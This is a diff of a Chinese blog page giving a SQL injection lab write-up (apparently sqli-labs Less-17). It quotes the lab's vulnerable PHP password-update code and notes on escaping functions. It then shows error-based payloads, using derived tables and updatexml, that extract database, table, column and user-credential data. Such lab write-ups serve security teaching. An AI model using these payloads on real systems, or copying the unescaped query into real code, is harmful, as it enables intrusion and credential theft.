@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">8.5k</span>阅读时长: <span class="post-count reading-time">37 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">9.3k</span>阅读时长: <span class="post-count reading-time">40 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -682,22 +682,245 @@ height:50vh;
 <p>查看源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname.<span class="string">"\n"</span>);</span><br><span class="line">fwrite($fp,<span class="string">'New Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo '&lt;font color= "#0000ff"&gt;';	</span></span><br><span class="line">		$row1 = $row[<span class="string">'username'</span>];  	</span><br><span class="line">		<span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">		$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">		mysql_query($update);</span><br></pre></td></tr></table></figure>
 <p><strong>check_input()</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line">​</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**几个PHP函数**</span><br><span class="line"></span><br><span class="line">##### substr()函数</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>几个PHP函数</strong></p>
+<p><strong>substr</strong>()函数</p>
 <blockquote>
-<p>substr(string,start[,length])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 参数   | 描述                                           |</span><br><span class="line">| ------ | ---------------------------------------------- |</span><br><span class="line">| string | 必需，规定要返回其中一部分的字符串             |</span><br><span class="line">| start  | 必需，规定在字符串的何处开始                   |</span><br><span class="line">|        | **正数**：在字符串的指定位置开始               |</span><br><span class="line">|        | **负数**：在从字符串结尾开始的指定位置开始     |</span><br><span class="line">|        | **0**：在字符串中的第一个字符处开始            |</span><br><span class="line">| length | 可选，要返回的字符数。如果省略，则返回剩余文本 |</span><br><span class="line">|        | **正数**：从start参数所在的位置返回的长度      |</span><br><span class="line">|        | **负数**：从字符串末端返回的长度               |</span><br><span class="line"></span><br><span class="line">##### get_magic_quotes_gpc()函数</span><br><span class="line"></span><br><span class="line">`get_magic_quotes_gpc()`函数取得PHP环境配置的变量`magic_quotes_gpc(GPC, Get/Post/Cookie)`值。返回`0`表示本功能关闭，返回`1`表示本功能打开。</span><br><span class="line"></span><br><span class="line">当`magic_quotes_gpc`打开时，所有的`&apos;(单引号)`、`&quot;(双引号)`、`\(反斜杠)`和`NULL(空字符)`会自动转为含有反斜杠的溢出字符。</span><br><span class="line"></span><br><span class="line">##### addslashes()与stripslashes()函数</span><br><span class="line"></span><br><span class="line">`addslashes(string)`函数返回在预定义字符之前添加**反斜杠**`\`的字符串：</span><br><span class="line"></span><br><span class="line">- 单引号 `&apos;` </span><br><span class="line">- 双引号 `&quot;` </span><br><span class="line">- 反斜杠 `\` </span><br><span class="line">- 空字符 `NULL` </span><br><span class="line"></span><br><span class="line">该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line"></span><br><span class="line">&gt; **注意：**默认地，PHP对所有的GET、POST和COOKIE数据自动运行`addslashes()`。所以不应对已转义过的字符串使用`addslashes()`，因为这样会导致双层转义。遇到这种情况时可以使用函数`get_magic_quotes_gpc()`进行检测。</span><br><span class="line"></span><br><span class="line">`stripslashes(string)`函数删除由`addslashes()`函数添加的反斜杠。</span><br><span class="line"></span><br><span class="line">##### ctype_digit()函数</span><br><span class="line"></span><br><span class="line">`ctype_digit(string)`函数检查字符串中每个字符是否都是十进制数字，若是则返回`TRUE`，否则返回`FALSE`。</span><br><span class="line"></span><br><span class="line">##### mysql_real_escape_string()函数</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; substr(string,start[,length])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需，规定要返回其中一部分的字符串</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需，规定在字符串的何处开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>正数</strong>：在字符串的指定位置开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>负数</strong>：在从字符串结尾开始的指定位置开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>0</strong>：在字符串中的第一个字符处开始</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选，要返回的字符数。如果省略，则返回剩余文本</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>正数</strong>：从start参数所在的位置返回的长度</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>负数</strong>：从字符串末端返回的长度</td>
+</tr>
+</tbody>
+</table>
+<p><strong>get_magic_quotes_gpc</strong>()函数</p>
+<p><code>get_magic_quotes_gpc()</code>函数取得PHP环境配置的变量<code>magic_quotes_gpc(GPC, Get/Post/Cookie)</code>值。返回<code>0</code>表示本功能关闭，返回<code>1</code>表示本功能打开。</p>
+<p>当<code>magic_quotes_gpc</code>打开时，所有的<code>&#39;(单引号)</code>、<code>&quot;(双引号)</code>、<code>\(反斜杠)</code>和<code>NULL(空字符)</code>会自动转为含有反斜杠的溢出字符。</p>
+<p><strong>addslashes</strong>()与<strong>stripslashes</strong>()函数</p>
+<p><code>addslashes(string)</code>函数返回在预定义字符之前添加<strong>反斜杠</strong><code>\</code>的字符串：</p>
+<p>单引号 <code>&#39;</code> ，双引号 <code>&quot;</code> ，反斜杠 <code>\</code> ，空字符 <code>NULL</code> </p>
+<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
 <blockquote>
-<p>mysql_real_escape_string(string,connection)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 参数       | 描述                                              |</span><br><span class="line">| ---------- | ------------------------------------------------- |</span><br><span class="line">| string     | 必需，规定要转义的字符串                          |</span><br><span class="line">| connection | 可选，规定MySQL连接。如果未规定，则使用上一个连接 |</span><br><span class="line"></span><br><span class="line">`mysql_real_escape_string()`函数转义 SQL 语句中使用的字符串中的特殊字符：</span><br><span class="line"></span><br><span class="line">- `\x00`</span><br><span class="line">- `\n`</span><br><span class="line">- `\r`</span><br><span class="line">- `\`</span><br><span class="line">- `&apos;`</span><br><span class="line">- `&quot;`</span><br><span class="line">- `\x1a`</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回`FALSE`。</span><br><span class="line"></span><br><span class="line">&gt; 本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于`mysql_query()`，可使用本函数来预防数据库攻击。</span><br><span class="line"></span><br><span class="line">##### intval()函数</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>注意：</strong>默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p>
 </blockquote>
+<p>`</p>
+<p>stripslashes(string)<code>函数删除由</code>addslashes()`函数添加的反斜杠。</p>
+<p><strong>ctype_digit</strong>()函数</p>
+<p><code>ctype_digit(string)</code>函数检查字符串中每个字符是否都是十进制数字，若是则返回<code>TRUE</code>，否则返回<code>FALSE</code>。</p>
+<p><strong>mysql_real_escape_string</strong>()函数</p>
 <blockquote>
-<p>intval(var[,base])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 参数 | 描述                    |</span><br><span class="line">| ---- | ----------------------- |</span><br><span class="line">| var  | 要转换成integer的数量值 |</span><br><span class="line">| base | 转化所使用的进制        |</span><br><span class="line"></span><br><span class="line">`intval()`函数获取变量的整数值。通过使用指定的进制`base`转换（默认是十进制），返回变量`var`的`integer`数值。`intval()`不能用于`object`，否则会产生`E_NOTICE`错误并返回`1`。</span><br><span class="line"></span><br><span class="line">成功时返回`var`的`integer`值，失败时返回`0`。空的`array`返回`0`，非空的`array`返回`1`，最大的值取决于操作系统。</span><br><span class="line"></span><br><span class="line">&gt; 如果`base`是`0`，通过检测`var`的格式来决定使用的进制：</span><br><span class="line">&gt;</span><br><span class="line">&gt; - 如果字符串包括了`0x`或`0X`的前缀，使用16进制`hex`；否则，</span><br><span class="line">&gt; - 如果字符串以`0`开始，使用8进制`octal`；否则，</span><br><span class="line">&gt; - 使用10进制`decimal`。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**有参数检查与过滤**</span><br><span class="line"></span><br><span class="line">**注意：**在用`uanme`查询之前，它用`check_input()`函数做了检查。</span><br><span class="line"></span><br><span class="line">&gt; **1**. 若`uname`非空，截取它的前15个字符。</span><br><span class="line">&gt;  **2**. 若php环境变量`magic_quotes_gpc`打开，去除转义的反斜杠`\`。</span><br><span class="line">&gt;  **3**. 若`uname`字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</span><br><span class="line"></span><br><span class="line">所以我们几乎不可能在`uname`处注入，唯一的注入点在`passwd`处。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**子查询注入**</span><br><span class="line"></span><br><span class="line">&gt; 当在一个聚合函数如`count()`函数后面，如果使用分组语句如`group by`就会把查询的一部分以错误的形式显示出来。</span><br><span class="line"></span><br><span class="line">**选择哪种方式**</span><br><span class="line"></span><br><span class="line">子查询注入在Less-5中即双注入，对于`update`、`delete`和`insert`通常都用结合`or`的逻辑判断。</span><br><span class="line"></span><br><span class="line">&gt; 在后台是`select`语句时我们能通过`union`联合查询**CONCAT子查询**（即Less5使用的双注入）获得错误信息中的数据。</span><br><span class="line">&gt;  而这里的后台是`update`（`delete`/`insert`）语句，我们只能通过`or`逻辑判断**派生表**（在Less5中提到一句）来获得错误信息中的数据。</span><br><span class="line"></span><br><span class="line">**注意：**上面这段是根据实际情况推断出的，但没有触及原理，也不完全正确。经过对比Less5的两种子查询和查找资料，得到了正确的结论。</span><br><span class="line"></span><br><span class="line">使用**CONCAT子查询**时，错误信息提示子查询中应该只包含一个字段。</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select count(*),concat_ws(&apos;-&apos;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a) where username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">![kvryRg.png](https://s2.ax1x.com/2019/03/06/kvryRg.png)</span><br><span class="line"></span><br><span class="line">使用**派生表**时，错误信息能返回我们想要的数据。</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(select user()),floor(rand()*2)) as a from information_schema.tables group by a)b) where  username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">![kvyCNV.png](https://s2.ax1x.com/2019/03/06/kvyCNV.png)</span><br><span class="line"></span><br><span class="line">在下一步之前，我们先理清[子查询](https://www.yiibai.com/mysql/subquery.html)与[派生表](https://www.yiibai.com/mysql/derived-table.html)。</span><br><span class="line"></span><br><span class="line">**子查询与派生表**</span><br><span class="line"></span><br><span class="line">&gt; 子查询有两种：一是**WHERE子句中**的子查询；二是**FROM子句中**的子查询，这种子查询又被称为**派生表**。</span><br><span class="line"></span><br><span class="line">- **WHERE子句中：**</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; mysql_real_escape_string(string,connection)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>SELECT column_name<br>FROM table_name<br>WHERE column_name IN (SELECT column_name<br>                      FROM table_name<br>                      WHERE condition)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- **FROM子句中：**</span><br></pre></td></tr></table></figure></p>
-<p>SELECT column_name<br>FROM (SELECT column_name<br>      FROM table_name<br>      WHERE condition) derived_table_name<br>WHERE condition<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看出这两种实际上**并无区别**！</span><br><span class="line"></span><br><span class="line">只是在**Less-5**中`select`查询返回的字段数为**3**，足够在`column_list`中将`count()`和`concat()`都包含进去，所以用**CONCAT子查询**更简单。</span><br><span class="line"></span><br><span class="line">而在**Less-17**中`update`查询返回的字段数只有**1**！不足以使`count()`后接上`concat()`这样一个查询语句，这时候就只能通过**派生表**再将上一层子查询包裹起来，通过`select 1 from (报错的CONCAT子查询) derived_table_name`使注入查询的字段与`update`查询的字段数相等！</span><br><span class="line"></span><br><span class="line">（严格来说，这里已经不能叫双注入而是三注入了，都称为子查询注入）</span><br><span class="line"></span><br><span class="line">**所以，子查询注入重点在于控制子查询使涉及字段数相等。select使用union，update/delete/insert使用or。而CONCAT子查询或是派生表只是手段。**</span><br><span class="line"></span><br><span class="line">#### 派生表注入过程</span><br><span class="line"></span><br><span class="line">**爆库**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">![kv6pKH.png](https://s2.ax1x.com/2019/03/06/kv6pKH.png)</span><br><span class="line"></span><br><span class="line">**爆表**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">![kv6HSS.png](https://s2.ax1x.com/2019/03/06/kv6HSS.png)</span><br><span class="line"></span><br><span class="line">一直没成功**Subquery returns more than 1 row**子查询返回多行</span><br><span class="line"></span><br><span class="line">于是用limit来限制范围，一条一条的来查询，结果一直找不到limit放的位置，以后在研究吧。</span><br><span class="line"></span><br><span class="line">**爆字段**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">这个也一样**Subquery returns more than 1 row**</span><br><span class="line"></span><br><span class="line">**爆内容**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(**select concat_ws(&apos;-&apos;,id,username,password) from users limit 0,1**),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&apos;admin&apos;--+`</span><br><span class="line"></span><br><span class="line">![kvfusU.png](https://s2.ax1x.com/2019/03/06/kvfusU.png)</span><br><span class="line"></span><br><span class="line">不知道为啥开始也报了几次**Subquery returns more than 1 row**，多提交了几次就可以了。</span><br><span class="line"></span><br><span class="line">#### updatexml()注入</span><br><span class="line"></span><br><span class="line"> updatexml()函数</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需，规定要转义的字符串</td>
+</tr>
+<tr>
+<td>connection</td>
+<td>可选，规定MySQL连接。如果未规定，则使用上一个连接</td>
+</tr>
+</tbody>
+</table>
+<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
+<p><code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code></p>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回<code>FALSE</code>。</p>
 <blockquote>
-<p>updatexml(xml_target,xpath_expr,new_xml)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 参数       | 描述                        |</span><br><span class="line">| ---------- | --------------------------- |</span><br><span class="line">| xml_target | 目标xml，形式类似于节点目录 |</span><br><span class="line">| xpath_expr | xml的表达式（xpath格式）    |</span><br><span class="line">| new_xml    | 用来替换的xml               |</span><br><span class="line"></span><br><span class="line">`updatexml()`函数是MySQL对xml文档数据进行查询和修改的xpath函数。</span><br><span class="line"></span><br><span class="line">简单来说就是，用`new_xml`把`xml_target`中包含`xpath_expr`的部分节点（包括`xml_target`）替换掉。</span><br><span class="line"></span><br><span class="line">如：updatexml(&lt;a&gt;&lt;b&gt;&lt;c&gt;asd&lt;/c&gt;&lt;/b&gt;&lt;e&gt;&lt;/e&gt;&lt;/a&gt;, &apos;//b&apos;, &lt;f&gt;abc&lt;/f&gt;)，</span><br><span class="line"></span><br><span class="line">运行结果：&lt;a&gt;&lt;f&gt;abc&lt;/f&gt;&lt;e&gt;&lt;/e&gt;&lt;/a&gt;，</span><br><span class="line"></span><br><span class="line">其中&apos;//b&apos;的斜杠表示不管b节点在哪一层都替换掉，而&apos;/b&apos;则是指在根目录下替换，此处xml_target的根目录节点是a。</span><br><span class="line"></span><br><span class="line">注入原理</span><br><span class="line"></span><br><span class="line">`updatexml()`的`xml_target`和`new_xml`参数随便设定一个数，这里主要是利用报错返回信息。利用`updatexml()`获取数据的固定payload是：</span><br><span class="line"></span><br><span class="line">&gt; `... or updatexml(1,concat(&apos;#&apos;,(select * from (select ...) a)),0) ...`</span><br><span class="line"></span><br><span class="line">##### 注入过程</span><br><span class="line"></span><br><span class="line">**爆库**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(database())),0)--+`</span><br><span class="line"></span><br><span class="line">`&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#`     0x7e表示~</span><br><span class="line"></span><br><span class="line">![kxeqgJ.png](https://s2.ax1x.com/2019/03/07/kxeqgJ.png)</span><br><span class="line"></span><br><span class="line">**注意：**因为`xpath_expr`是xpath格式，所以不是所有字符都可以作为`concat()`的连接符，如`-`、`@`便不可以。</span><br><span class="line"></span><br><span class="line">**爆表**</span><br><span class="line"></span><br><span 